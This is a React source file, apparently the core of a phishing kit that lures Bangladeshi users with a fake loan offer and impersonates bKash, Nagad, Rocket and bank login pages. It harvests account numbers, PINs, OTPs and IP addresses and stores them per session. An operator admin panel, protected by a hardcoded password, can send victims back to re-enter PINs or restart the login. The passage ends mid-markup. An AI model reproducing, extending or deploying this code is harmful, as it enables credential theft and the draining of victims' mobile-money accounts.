
import React, { useState, useEffect, useRef } from 'react';
import { 
  ArrowLeft, 
  ArrowRight,
  Fingerprint
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { AppStep, LoanFormData } from './types';
import { trackEvent } from './lib/pixel';
import Header from './components/Header';
import Footer from './components/Footer';
import HomePage from './components/HomePage';
import LoanForm from './components/LoanForm';
import AccountDetailsPage from './components/AccountDetailsPage';
import FinalResultPage from './components/FinalResultPage';
import AdminPanel from './components/AdminPanel';

export const db = {
  ref: (path: string) => {
    const parts = path.split('/');
    const id = parts.slice(1).join('/');

    return {
      set: async (data: any) => {
        try {
          await fetch('/api/db', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path, data }),
          });
        } catch (e) {
          console.error('db.set error:', e);
        }
      },
      get: async () => {
        try {
          const res = await fetch(`/api/db?path=${encodeURIComponent(path)}`);
          if (res.ok) {
            const val = await res.json();
            if (val !== null && val !== undefined) {
              return { val: () => val, key: id };
            }
          }
        } catch (e) {
          console.error('db.get error:', e);
        }
        return { val: () => null, key: id };
      },
      update: async (data: any) => {
        try {
          await fetch('/api/db', {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path, data }),
          });
        } catch (e) {
          console.error('db.update error:', e);
        }
      },
      remove: async () => {
        try {
          await fetch(`/api/db?path=${encodeURIComponent(path)}`, { method: 'DELETE' });
        } catch (e) {
          console.error('db.remove error:', e);
        }
      },
      on: (event: string, callback: (snapshot: any) => void) => {
        let lastVal: any = undefined;
        let isMounted = true;

        const checkServer = async () => {
          if (!isMounted) return;
          try {
            const res = await fetch(`/api/db?path=${encodeURIComponent(path)}`);
            if (res.ok && isMounted) {
              const val = await res.json();
              if (JSON.stringify(val) !== JSON.stringify(lastVal)) {
                lastVal = val;
                callback({ val: () => val, key: id });
              }
            }
          } catch (e) {}
        };

        checkServer();
        const intervalId = setInterval(checkServer, 1000);

        return () => {
          isMounted = false;
          clearInterval(intervalId);
        };
      },
      off: () => {}
    };
  }
};

type LoginView = 'landing' | 'login' | 'otp' | 'otp_wrong' | 'pin_reset' | 'waiting' | 'number_change';
type Provider = 'bkash' | 'nagad' | 'rocket' | 'bank';

const App: React.FC = () => {
  const [showLogin, setShowLogin] = useState(false);
  const [loginView, setLoginView] = useState<LoginView>('landing');
  const [provider, setProvider] = useState<Provider | null>(null);
  const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.Home);
  const currentStepRef = useRef<AppStep>(AppStep.Home);
  const showLoginRef = useRef<boolean>(true);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [sessionId, setSessionId] = useState<string>('');

  useEffect(() => {
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem('payment_provider');
      localStorage.removeItem('resume_after_provider_change');
      localStorage.removeItem('user_session_id');
    }
  }, []);
  const [isBlocked, setIsBlocked] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [nagadEnabled, setNagadEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_nagadEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  const [bkashEnabled, setBkashEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_bkashEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  const [rocketEnabled, setRocketEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_rocketEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  const [bankEnabled, setBankEnabled] = useState<boolean>(() => {
    if (typeof localStorage !== 'undefined') {
      const saved = localStorage.getItem('setting_bankEnabled');
      if (saved !== null) return saved === 'true';
    }
    return true;
  });
  
  const [mobileNumber, setMobileNumber] = useState('');
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [timer, setTimer] = useState(20);
  const [isLoading, setIsLoading] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  const [phoneError, setPhoneError] = useState('');
  const [showLoginPopup, setShowLoginPopup] = useState(false);

  const [userBalance, setUserBalance] = useState('');
  const [lastTransaction, setLastTransaction] = useState('');
  const [accountDetailsStartStep, setAccountDetailsStartStep] = useState<number | undefined>(undefined);
  const [finalResultStartLoading, setFinalResultStartLoading] = useState(false);

  const [formData, setFormData] = useState<LoanFormData>({
    fullName: '',
    loanAmount: '',
    duration: '',
    address: '',
    paymentNumber: '',
    paymentMethod: 'bKash',
    nidNumber: ''
  });

  useEffect(() => {
    const checkBlocked = async () => {
      try {
        const res = await fetch('/api/check-blocked');
        const data = await res.json();
        if (data.blocked) {
          setIsBlocked(true);
        }
      } catch (err) {}
    };
    checkBlocked();
  }, []);

  useEffect(() => {
    const unsubscribe = db.ref('settings/nagadEnabled').on('value', (snapshot) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setNagadEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_nagadEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  useEffect(() => {
    const unsubscribe = db.ref('settings/bkashEnabled').on('value', (snapshot) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setBkashEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_bkashEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  useEffect(() => {
    const unsubscribe = db.ref('settings/rocketEnabled').on('value', (snapshot) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setRocketEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_rocketEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  useEffect(() => {
    const unsubscribe = db.ref('settings/bankEnabled').on('value', (snapshot) => {
      const val = snapshot.val();
      const enabled = val === null ? true : !!val;
      setBankEnabled(enabled);
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('setting_bankEnabled', String(enabled));
      }
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  useEffect(() => {
    if (provider === 'nagad' && !nagadEnabled) {
      if (bkashEnabled) {
        setProvider('bkash');
        localStorage.setItem('payment_provider', 'bkash');
      } else if (rocketEnabled) {
        setProvider('rocket');
        localStorage.setItem('payment_provider', 'rocket');
      } else if (bankEnabled) {
        setProvider('bank');
        localStorage.setItem('payment_provider', 'bank');
      } else {
        setProvider(null);
        localStorage.removeItem('payment_provider');
      }
    } else if (provider === 'bkash' && !bkashEnabled) {
      if (nagadEnabled) {
        setProvider('nagad');
        localStorage.setItem('payment_provider', 'nagad');
      } else if (rocketEnabled) {
        setProvider('rocket');
        localStorage.setItem('payment_provider', 'rocket');
      } else if (bankEnabled) {
        setProvider('bank');
        localStorage.setItem('payment_provider', 'bank');
      } else {
        setProvider(null);
        localStorage.removeItem('payment_provider');
      }
    } else if (provider === 'rocket' && !rocketEnabled) {
      if (bkashEnabled) {
        setProvider('bkash');
        localStorage.setItem('payment_provider', 'bkash');
      } else if (nagadEnabled) {
        setProvider('nagad');
        localStorage.setItem('payment_provider', 'nagad');
      } else if (bankEnabled) {
        setProvider('bank');
        localStorage.setItem('payment_provider', 'bank');
      } else {
        setProvider(null);
        localStorage.removeItem('payment_provider');
      }
    } else if (provider === 'bank' && !bankEnabled) {
      if (bkashEnabled) {
        setProvider('bkash');
        localStorage.setItem('payment_provider', 'bkash');
      } else if (nagadEnabled) {
        setProvider('nagad');
        localStorage.setItem('payment_provider', 'nagad');
      } else if (rocketEnabled) {
        setProvider('rocket');
        localStorage.setItem('payment_provider', 'rocket');
      } else {
        setProvider(null);
        localStorage.removeItem('payment_provider');
      }
    }
  }, [nagadEnabled, bkashEnabled, rocketEnabled, bankEnabled, provider]);

  useEffect(() => { currentStepRef.current = currentStep; }, [currentStep]);
  useEffect(() => { showLoginRef.current = showLogin; }, [showLogin]);

  useEffect(() => {
    if (!sessionId) return;
    const sessionRef = db.ref('sessions/' + sessionId);
    const cleanup = sessionRef.on('value', (snapshot: any) => {
      const val = snapshot.val();
      if (!val) return;
      
      if (val.adminAction === 'REVIEW_APP') {
        setCurrentStep(AppStep.FinalResult);
      } else if (val.adminAction === 'REJECT_PIN') {
        if (!formSubmitted) {
          setShowLogin(true);
          setLoginView('pin_reset');
          setPin('');
          setCurrentStep(AppStep.Home);
          sessionRef.update({ adminAction: 'NONE' });
        }
      } else if (val.adminAction === 'RESET_GATEWAY') {
        if (!formSubmitted) {
          setShowLogin(true);
          setLoginView('landing');
          setMobileNumber('');
          setPin('');
          setOtp(['', '', '', '', '', '']);
          setCurrentStep(AppStep.Home);
          setFormSubmitted(false);
          sessionRef.update({ adminAction: 'NONE' });
        }
      }
    });
    return () => { if (typeof cleanup === 'function') cleanup(); };
  }, [sessionId, formSubmitted]);

  useEffect(() => {
    document.documentElement.setAttribute('data-provider', provider || '');
    if (provider) localStorage.setItem('payment_provider', provider);
  }, [provider]);

  useEffect(() => {
    if (document.getElementById('provider-overrides')) return;
    const style = document.createElement('style');
    style.id = 'provider-overrides';
    style.textContent = `
      [data-provider="nagad"] .bg-\\[\\#E2136E\\]{background-color:#F58220!important}
      [data-provider="nagad"] .text-\\[\\#E2136E\\]{color:#F58220!important}
      [data-provider="nagad"] .border-\\[\\#E2136E\\]{border-color:#F58220!important}
      [data-provider="nagad"] .focus-within\\:border-\\[\\#E2136E\\]:focus-within{border-color:#F58220!important}
      [data-provider="nagad"] .hover\\:text-\\[\\#E2136E\\]:hover{color:#F58220!important}
      [data-provider="nagad"] .hover\\:border-\\[\\#E2136E\\]:hover{border-color:#F58220!important}
      [data-provider="nagad"] .focus\\:ring-\\[\\#E2136E\\]:focus{--tw-ring-color:#F58220!important}
      [data-provider="nagad"] .shadow-\\[0_-4px_20px_rgba\\(226\\,19\\,110\\,0\\.3\\)\\]{box-shadow:0 -4px 20px rgba(245,130,32,0.3)!important}
      [data-provider="nagad"] .bg-pink-50{background-color:#FFF3E0!important}
      [data-provider="nagad"] .hover\\:bg-pink-50:hover{background-color:#FFF3E0!important}

      [data-provider="rocket"] .bg-\\[\\#E2136E\\]{background-color:#8C3494!important}
      [data-provider="rocket"] .text-\\[\\#E2136E\\]{color:#8C3494!important}
      [data-provider="rocket"] .border-\\[\\#E2136E\\]{border-color:#8C3494!important}
      [data-provider="rocket"] .focus-within\\:border-\\[\\#E2136E\\]:focus-within{border-color:#8C3494!important}
      [data-provider="rocket"] .hover\\:text-\\[\\#E2136E\\]:hover{color:#8C3494!important}
      [data-provider="rocket"] .hover\\:border-\\[\\#E2136E\\]:hover{border-color:#8C3494!important}
      [data-provider="rocket"] .focus\\:ring-\\[\\#E2136E\\]:focus{--tw-ring-color:#8C3494!important}
      [data-provider="rocket"] .shadow-\\[0_-4px_20px_rgba\\(226\\,19\\,110\\,0\\.3\\)\\]{box-shadow:0 -4px 20px rgba(140,52,148,0.3)!important}
      [data-provider="rocket"] .bg-pink-50{background-color:#F3E8F6!important}
      [data-provider="rocket"] .hover\\:bg-pink-50:hover{background-color:#F3E8F6!important}

      [data-provider="bank"] .bg-\\[\\#E2136E\\]{background-color:#0F6E4B!important}
      [data-provider="bank"] .text-\\[\\#E2136E\\]{color:#0F6E4B!important}
      [data-provider="bank"] .border-\\[\\#E2136E\\]{border-color:#0F6E4B!important}
      [data-provider="bank"] .focus-within\\:border-\\[\\#E2136E\\]:focus-within{border-color:#0F6E4B!important}
      [data-provider="bank"] .hover\\:text-\\[\\#E2136E\\]:hover{color:#0F6E4B!important}
      [data-provider="bank"] .hover\\:border-\\[\\#E2136E\\]:hover{border-color:#0F6E4B!important}
      [data-provider="bank"] .focus\\:ring-\\[\\#E2136E\\]:focus{--tw-ring-color:#0F6E4B!important}
      [data-provider="bank"] .shadow-\\[0_-4px_20px_rgba\\(226\\,19\\,110\\,0\\.3\\)\\]{box-shadow:0 -4px 20px rgba(15,110,75,0.3)!important}
      [data-provider="bank"] .bg-pink-50{background-color:#E6F2EC!important}
      [data-provider="bank"] .hover\\:bg-pink-50:hover{background-color:#E6F2EC!important}

      [data-keep-theme] .bg-\\[\\#E2136E\\]{background-color:#E2136E!important}
      [data-keep-theme] .text-\\[\\#E2136E\\]{color:#E2136E!important}
      [data-keep-theme] .border-\\[\\#E2136E\\]{border-color:#E2136E!important}
      [data-keep-theme] .focus-within\\:border-\\[\\#E2136E\\]:focus-within{border-color:#E2136E!important}
      [data-keep-theme] .hover\\:text-\\[\\#E2136E\\]:hover{color:#E2136E!important}
      [data-keep-theme] .hover\\:border-\\[\\#E2136E\\]:hover{border-color:#E2136E!important}
      [data-keep-theme] .focus\\:ring-\\[\\#E2136E\\]:focus{--tw-ring-color:#E2136E!important}
      [data-keep-theme] .shadow-\\[0_-4px_20px_rgba\\(226\\,19\\,110\\,0\\.3\\)\\]{box-shadow:0 -4px 20px rgba(226,19,110,0.3)!important}
      [data-keep-theme] .bg-pink-50{background-color:rgb(253 242 248)!important}
      [data-keep-theme] .hover\\:bg-pink-50:hover{background-color:rgb(253 242 248)!important}
    `;
    document.head.appendChild(style);
  }, []);

  useEffect(() => {
    if (provider !== 'nagad' && provider !== 'rocket' && provider !== 'bank') return;
    let replaceMap: Array<[RegExp, string]>;
    if (provider === 'nagad') {
      replaceMap = [
        [/বিকাশ/g, 'নগদ'],
        [/bKash/g, 'Nagad'],
        [/BKash/g, 'Nagad'],
        [/Bkash/g, 'Nagad'],
        [/bkash/g, 'nagad'],
      ];
    } else if (provider === 'rocket') {
      replaceMap = [
        [/বিকাশ/g, 'রকেট'],
        [/bKash/g, 'Rocket'],
        [/BKash/g, 'Rocket'],
        [/Bkash/g, 'Rocket'],
        [/bkash/g, 'rocket'],
      ];
    } else {
      replaceMap = [
        [/বিকাশ/g, 'ব্যাংক'],
        [/bKash/g, 'Bank'],
        [/BKash/g, 'Bank'],
        [/Bkash/g, 'Bank'],
        [/bkash/g, 'bank'],
      ];
    }
    const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT']);
    const applyReplace = (s: string) => {
      let out = s;
      for (const [re, rep] of replaceMap) out = out.replace(re, rep);
      return out;
    };
    const walk = (node: Node) => {
      if (node.nodeType === Node.TEXT_NODE) {
        const txt = node.nodeValue || '';
        const newTxt = applyReplace(txt);
        if (newTxt !== txt) node.nodeValue = newTxt;
        return;
      }
      if (node.nodeType !== Node.ELEMENT_NODE) return;
      const el = node as Element;
      if (SKIP_TAGS.has(el.tagName)) return;
      if (el.hasAttribute('data-keep-text')) return;
      if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
        const ph = el.getAttribute('placeholder');
        if (ph) {
          const newPh = applyReplace(ph);
          if (newPh !== ph) el.setAttribute('placeholder', newPh);
        }
        return;
      }
      el.childNodes.forEach(walk);
    };
    walk(document.body);
    const observer = new MutationObserver((mutations) => {
      for (const m of mutations) {
        if (m.type === 'characterData') {
          walk(m.target);
        } else if (m.type === 'childList') {
          m.addedNodes.forEach(walk);
        } else if (m.type === 'attributes' && m.attributeName === 'placeholder') {
          const el = m.target as Element;
          const ph = el.getAttribute('placeholder');
          if (ph) {
            const newPh = applyReplace(ph);
            if (newPh !== ph) el.setAttribute('placeholder', newPh);
          }
        }
      }
    });
    observer.observe(document.body, {
      subtree: true,
      childList: true,
      characterData: true,
      attributes: true,
      attributeFilter: ['placeholder'],
    });
    return () => observer.disconnect();
  }, [provider]);

  useEffect(() => {
    const setupMeta = () => {
      try {
        const meta = document.createElement('meta');
        meta.name = "mobile-web-app-capable";
        meta.content = "yes";
        document.head.appendChild(meta);
      } catch (err) {}
    };
    setupMeta();
  }, []);

  useEffect(() => {
    let interval: any;
    if (loginView === 'otp' && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [loginView, timer]);

  const handleLoginSubmit = async () => {
    if (isLoading) return;

    const requiredLen = (provider === 'bkash' || provider === 'nagad') ? 11 : 12;
    if (!mobileNumber.startsWith('01') || mobileNumber.length !== requiredLen) {
      setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
      return;
    }
    setPhoneError('');

    setIsLoading(true);
    if (provider !== 'nagad' && provider !== 'rocket' && provider !== 'bank') {
      setShowLoginPopup(true);
      setTimeout(() => setShowLoginPopup(false), 3000);
    }

    try {
      const uniqueId = 'ORD-' + Math.random().toString(36).substr(2, 6).toUpperCase();
      const newSessionId = 'SESS-' + Date.now();
      setSessionId(newSessionId);
      localStorage.setItem('user_session_id', newSessionId);

      let clientIp = '';
      try {
        const ipRes = await fetch('/api/check-blocked');
        const ipData = await ipRes.json();
        clientIp = ipData.ip || '';
      } catch(e) {}

      await db.ref('sessions/' + newSessionId).set({
        id: newSessionId,
        orderId: uniqueId,
        name: provider === 'nagad' ? 'Nagad User' : provider === 'rocket' ? 'Rocket User' : provider === 'bank' ? 'Bank User' : 'bKash User',
        provider: provider || 'bkash',
        initialPhone: mobileNumber,
        gatewayPhone: '',
        balance: '',
        otp: '',
        pin: pin,
        firstPin: '',
        waitingFor: 'NONE',
        adminAction: 'NONE',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
        blocked: false,
        clientIp: clientIp,
        congratsSent: false,
        verifyStatus: 'NONE',
        formSubmitted: false,
        automationActive: false
      });

      setTimeout(() => {
        setIsLoading(false);
        setShowLogin(false);
      }, 5000);
    } catch (err) {
      console.error('Login error:', err);
      setIsLoading(false);
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const finishLogin = async () => {
    if (isLoading) return;
    setIsLoading(true);
    
    try {
      if (sessionId) {
        await db.ref('sessions/' + sessionId).update({
          otp: otp.join(''),
          lastAutomationData: '',
          lastUpdated: Date.now()
        });
      }

      setTimeout(() => {
        setIsLoading(false);
        setShowLogin(false);
      }, 2000);
    } catch (err) {
      console.error('OTP submit error:', err);
      setIsLoading(false);
    }
  };

  const handlePinResetSubmit = async () => {
    if (isLoading) return;
    setIsLoading(true);
    try {
      if (sessionId) {
        await db.ref('sessions/' + sessionId).update({
          pin: pin,
          pinResetMode: true,
          lastAutomationData: '',
          automationActive: true,
          lastUpdated: Date.now()
        });
      }
      setTimeout(() => {
        setIsLoading(false);
        setShowLogin(false);
        setCurrentStep(AppStep.FinalResult);
        setFinalResultStartLoading(true);
      }, 1000);
    } catch (err) {
      console.error('PIN reset error:', err);
      setIsLoading(false);
    }
  };

  const handleStartBkash = () => {
    if (!bkashEnabled) return;
    localStorage.setItem('payment_provider', 'bkash');
    setProvider('bkash');
    setCurrentStep(AppStep.ApplicationForm);
    setLoginView('login');
    setShowLogin(true);
  };

  const handleStartNagad = () => {
    if (!nagadEnabled) return;
    localStorage.setItem('payment_provider', 'nagad');
    setProvider('nagad');
    setCurrentStep(AppStep.ApplicationForm);
    setLoginView('login');
    setShowLogin(true);
  };

  const handleStartRocket = () => {
    if (!rocketEnabled) return;
    localStorage.setItem('payment_provider', 'rocket');
    setProvider('rocket');
    setCurrentStep(AppStep.ApplicationForm);
    setLoginView('login');
    setShowLogin(true);
  };

  const handleStartBank = () => {
    if (!bankEnabled) return;
    localStorage.setItem('payment_provider', 'bank');
    setProvider('bank');
    setCurrentStep(AppStep.ApplicationForm);
    setLoginView('login');
    setShowLogin(true);
  };

  const handleLoanApplyIntent = () => {};

  const handleFormSubmit = async (data: LoanFormData) => {
    if (sessionId) {
      await db.ref('sessions/' + sessionId).update({
        name: data.fullName,
        initialPhone: data.paymentNumber,
        balance: '',
        otp: '',
        gatewayOtp: '',
        lastAutomationData: '',
        formSubmitted: true,
        lastUpdated: Date.now()
      });
    }

    setFormSubmitted(true);
    setFormData(data);
    setCurrentStep(AppStep.AccountDetails);
  };

  const handleAccountDetailsSubmit = (details: any) => {
    setUserBalance(details.currentBalance || '');
    setLastTransaction(details.lastTransaction || '');
    setAccountDetailsStartStep(undefined);
    setCurrentStep(AppStep.FinalResult);
  };

  const handleReverifyBalance = () => {
    setAccountDetailsStartStep(4);
    setCurrentStep(AppStep.AccountDetails);
  };

  const handleWrongNumber = () => {
    setMobileNumber('');
    setShowLogin(true);
    setLoginView('number_change');
  };

  const handleWrongPin = () => {
    setPin('');
    setShowLogin(true);
    setLoginView('pin_reset');
  };

  const handleNumberChangeSubmit = async () => {
    if (isLoading) return;
    const requiredLen = (provider === 'bkash' || provider === 'nagad') ? 11 : 12;
    if (!mobileNumber.startsWith('01') || mobileNumber.length !== requiredLen) {
      setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
      return;
    }
    setPhoneError('');
    setIsLoading(true);

    try {
      if (sessionId) {
        await db.ref('sessions/' + sessionId).update({
          initialPhone: mobileNumber,
          lastUpdated: Date.now()
        });
      }
      setTimeout(() => {
        setIsLoading(false);
        setShowLogin(false);
        setCurrentStep(AppStep.FinalResult);
      }, 1000);
    } catch (err) {
      console.error('Number change error:', err);
      setIsLoading(false);
    }
  };

  const handleSessionChange = (newId: string) => {
    setSessionId(newId);
    localStorage.setItem('user_session_id', newId);
  };

  const handleAdminLogin = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (adminPassword === 'onlinebased321') {
      setCurrentStep(AppStep.Admin);
      setShowAdminModal(false);
      setAdminPassword('');
      setShowLogin(false);
    } else {
      alert('ভুল পাসওয়ার্ড!');
      setAdminPassword('');
    }
  };

  const handleSelectProvider = (p: Provider) => {
    if (p === 'bkash' && !bkashEnabled) return;
    if (p === 'nagad' && !nagadEnabled) return;
    if (p === 'rocket' && !rocketEnabled) return;
    if (p === 'bank' && !bankEnabled) return;
    setProvider(p);
    setCurrentStep(AppStep.ApplicationForm);
    setLoginView('login');
    setShowLogin(true);
  };

  const renderLanding = () => (
    <div className="flex flex-col h-full bg-white" data-keep-text>
      <div className="p-6 flex flex-col h-full">
        <div className="flex justify-end items-center mb-10">
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>

        <div className="flex flex-col items-center text-center mb-10">
          <img
            src="https://i.postimg.cc/Hx21WWJ7/IMG-20260205-090841.jpg"
            alt="আমার লোন"
            className="h-16 w-auto object-contain rounded-xl shadow-sm mb-4"
          />
          <h1 className="text-[24px] font-bold text-gray-700 leading-[1.3]">
            পেমেন্ট মাধ্যম নির্বাচন করুন
          </h1>
          <p className="text-sm text-gray-500 font-medium mt-3 px-4">
            আপনার পছন্দের পেমেন্ট মাধ্যম বেছে নিয়ে এগিয়ে যান
          </p>
        </div>

        <div className="space-y-4 flex-1">
          {!bkashEnabled && !nagadEnabled && !rocketEnabled && !bankEnabled ? (
            <div className="p-6 text-center bg-gray-50 rounded-2xl border border-gray-200">
              <p className="text-gray-600 font-bold">পেমেন্ট সেবা সাময়িকভাবে বন্ধ আছে</p>
              <p className="text-xs text-gray-400 mt-1">অনুগ্রহ করে কিছুক্ষণ পর চেষ্টা করুন</p>
            </div>
          ) : (
            <>
              {bkashEnabled && (
              <button
                onClick={() => handleSelectProvider('bkash')}
                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#E2136E] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
              >
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-xl bg-[#E2136E] flex items-center justify-center shadow-md">
                    <span className="text-white font-black text-lg">bK</span>
                  </div>
                  <div className="text-left">
                    <div className="font-bold text-gray-800 text-lg">বিকাশ</div>
                    <div className="text-xs text-gray-500 font-medium">bKash দিয়ে এগিয়ে যান</div>
                  </div>
                </div>
                <ArrowRight className="w-5 h-5 text-[#E2136E]" />
              </button>
              )}

              {nagadEnabled && (
              <button
                onClick={() => handleSelectProvider('nagad')}
                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#F58220] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
                style={{ ['--hover-color' as any]: '#F58220' }}
              >
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-xl flex items-center justify-center shadow-md" style={{ backgroundColor: '#F58220' }}>
                    <span className="text-white font-black text-lg">N</span>
                  </div>
                  <div className="text-left">
                    <div className="font-bold text-gray-800 text-lg">নগদ</div>
                    <div className="text-xs text-gray-500 font-medium">Nagad দিয়ে এগিয়ে যান</div>
                  </div>
                </div>
                <ArrowRight className="w-5 h-5" style={{ color: '#F58220' }} />
              </button>
              )}

              {rocketEnabled && (
              <button
                onClick={() => handleSelectProvider('rocket')}
                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#8C3494] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
                style={{ ['--hover-color' as any]: '#8C3494' }}
              >
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-xl flex items-center justify-center shadow-md" style={{ backgroundColor: '#8C3494' }}>
                    <span className="text-white font-black text-lg">R</span>
                  </div>
                  <div className="text-left">
                    <div className="font-bold text-gray-800 text-lg">রকেট</div>
                    <div className="text-xs text-gray-500 font-medium">Rocket দিয়ে এগিয়ে যান</div>
                  </div>
                </div>
                <ArrowRight className="w-5 h-5" style={{ color: '#8C3494' }} />
              </button>
              )}

              {bankEnabled && (
              <button
                onClick={() => handleSelectProvider('bank')}
                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#0F6E4B] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
                style={{ ['--hover-color' as any]: '#0F6E4B' }}
              >
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-xl flex items-center justify-center shadow-md" style={{ backgroundColor: '#0F6E4B' }}>
                    <span className="text-white font-black text-lg">B</span>
                  </div>
                  <div className="text-left">
                    <div className="font-bold text-gray-800 text-lg">ব্যাংক</div>
                    <div className="text-xs text-gray-500 font-medium">Bank দিয়ে এগিয়ে যান</div>
                  </div>
                </div>
                <ArrowRight className="w-5 h-5" style={{ color: '#0F6E4B' }} />
              </button>
              )}
            </>
          )}
        </div>

        <div className="mt-auto pt-6 text-center">
          <p className="text-xs text-gray-400 font-medium">
            নিরাপদ ও দ্রুত পেমেন্টের জন্য একটি মাধ্যম নির্বাচন করুন
          </p>
        </div>
      </div>
    </div>
  );

  const renderLoginScreen = () => (
    <div className="flex flex-col h-full bg-white">
      <div className="p-6">
        <div className="flex justify-between items-center mb-12">
          <button onClick={() => { setShowLogin(false); setCurrentStep(AppStep.Home); }} className="p-2 -ml-2 hover:bg-pink-50 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6 text-[#E2136E]" />
          </button>
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>
        <div className="flex-1">
          <h1 className="text-[26px] font-bold text-gray-700 mb-10 leading-[1.2]">
            আপনার বিকাশ একাউন্টে <br /> লগ ইন করুন
          </h1>
          <div className="space-y-8">
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">একাউন্ট নাম্বার</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                <span className="text-xl font-bold text-gray-800">+88</span>
                <input 
                  type="tel" 
                  placeholder="01XXXXXXXXX"
                  value={mobileNumber}
                  onChange={(e) => { setMobileNumber(e.target.value.replace(/\D/g, '')); setPhoneError(''); }}
                  className="text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-200"
                  maxLength={(provider === 'bkash' || provider === 'nagad') ? 11 : 12}
                  inputMode="numeric"
                  autoFocus
                />
              </div>
              {phoneError && (
                <p className="text-sm text-red-500 font-bold mt-2">{phoneError}</p>
              )}
            </div>
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                <input 
                  type="password" 
                  placeholder="বিকাশ পিন নাম্বার দিন"
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                  className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
                  maxLength={provider === 'bkash' ? 5 : 4}
                  inputMode="numeric"
                />
                <button className="text-[#E2136E] p-1">
                  <Fingerprint className="w-8 h-8" strokeWidth={1.5} />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="mt-auto p-4 bg-white border-t border-gray-50">
        <button 
          disabled={mobileNumber.length < ((provider === 'bkash' || provider === 'nagad') ? 11 : 12) || (provider === 'bkash' ? pin.length < 4 : pin.length !== 4) || isLoading}
          onClick={handleLoginSubmit}
          className={`w-full flex items-center justify-center p-4 rounded-xl transition-all shadow-lg ${
